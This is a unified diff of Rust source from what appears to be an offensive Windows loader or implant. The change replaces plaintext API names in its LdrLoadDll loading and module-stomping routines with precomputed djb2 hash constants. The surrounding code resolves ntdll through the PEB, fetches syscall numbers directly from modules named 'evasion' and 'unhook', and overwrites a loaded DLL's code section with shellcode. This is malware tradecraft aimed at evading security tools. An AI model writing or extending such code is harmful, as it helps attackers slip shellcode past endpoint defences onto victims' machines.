@@ -9,11 +9,12 @@ struct UnicodeString {
 
 #[cfg(all(target_os = "windows", target_arch = "x86_64"))]
 pub unsafe fn ldr_load_dll_by_name(dll_name: &[u8]) {
-    use crate::resolve::api_hash::{djb2_hash, djb2_hash_lower, peb_get_module_base, resolve_by_hash};
+    use crate::resolve::api_hash::{djb2_hash_lower, peb_get_module_base, resolve_by_hash};
+    use crate::resolve::api_hash::h;
     const NTDLL_H: u32 = djb2_hash_lower(b"ntdll.dll");
     let ntdll = peb_get_module_base(NTDLL_H);
     if ntdll.is_null() { return; }
-    let ldr_fn = match resolve_by_hash(ntdll, djb2_hash(b"LdrLoadDll")) {
+    let ldr_fn = match resolve_by_hash(ntdll, h::LDR_LOAD) {
         Some(p) => p, None => return,
     };
     let ascii: &[u8] = dll_name.iter().take_while(|&&b| b != 0).as_slice();
@@ -35,7 +36,8 @@ pub unsafe fn ldr_load_dll_by_name(dll_name: &[u8]) {
 
 #[cfg(target_os = "windows")]
 pub unsafe fn stomp_module(dll_name: &[u8], shellcode: &[u8]) -> Option<*mut u8> {
-    use crate::evasion::{syscalls::get_ssn, unhook::get_text_section};
+    use crate::evasion::{syscalls::get_ssn_h, unhook::get_text_section};
+    use crate::resolve::api_hash::h;
     #[cfg(target_arch = "x86_64")]
     use crate::resolve::api_hash::{djb2_hash_lower, peb_get_module_base};
 
@@ -60,7 +62,7 @@ pub unsafe fn stomp_module(dll_name: &[u8], shellcode: &[u8]) -> Option<*mut u8>
 
     let target = module_base.add(text_rva);
 
-    let (ssn, tramp) = get_ssn(b"NtProtectVirtualMemory")?;
+    let (ssn, tramp) = get_ssn_h(h::NT_PROT_VM)?;
     let ph: usize = usize::MAX; // -1 = current process
 
     let mut base  = target as usize;
